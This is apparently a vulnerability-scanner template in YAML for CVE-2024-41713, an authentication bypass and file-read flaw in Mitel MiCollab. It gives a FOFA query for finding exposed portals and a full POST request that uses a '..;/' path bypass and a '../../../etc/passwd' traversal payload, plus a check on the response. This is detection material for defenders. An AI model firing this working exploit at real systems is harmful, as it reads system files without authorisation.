id: CVE-2024-41713
info:
  name: MitelMiCollab 身份绕过导致任意文件读取漏洞
  author: avic123
  severity: high
  verified: true
  description: |
    Mitel MiCollab 是一个企业协作平台，它将各种通信工具整合到一个应用程序中，提供语音和视频通话、消息传递、状态信息、音频会议、移动支持和团队协作功能。该软件的 NuPoint 统一消息 (NPM) 组件中存在身份验证绕过漏洞，由于输入验证不足，未经身份验证的远程攻击者可利用该漏洞执行路径遍历攻击，成功利用可能导致未授权访问、破坏或删除用户的数据和系统配置
    fofa: body="MiCollab End User Portal"
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzUxMTk4OTA1NQ==&mid=2247484772&idx=1&sn=8e593a28c598c058805d54e0cfef6028
  created: 2025/01/08

rules:
  r0:
    request:
      method: POST
      path: /npm-pwg/..;/ReconcileWizard/reconcilewizard/sc/IDACall?isc_rpc=1&isc_v=&isc_tnum=2
      body: |
        _transaction=<transaction xmlns:xsi="http://www.w3.org/2000/10/XMLSchema-instance" xsi:type="xsd:Object"><transactionNum xsi:type="xsd:long">2</transactionNum><operations xsi:type="xsd:List"><elem xsi:type="xsd:Object"><criteria xsi:type="xsd:Object"><reportName>../../../etc/passwd</reportName></criteria><operationConfig xsi:type="xsd:Object"><dataSource>summary_reports</dataSource><operationType>fetch</operationType></operationConfig><appID>builtinApplication</appID><operation>downloadReport</operation><oldValues xsi:type="xsd:Object"><reportName>x.txt</reportName></oldValues></elem></operations><jscallback>x</jscallback></transaction>&protocolVersion=1.0&__iframeTarget__=x
    expression: >-
      response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()
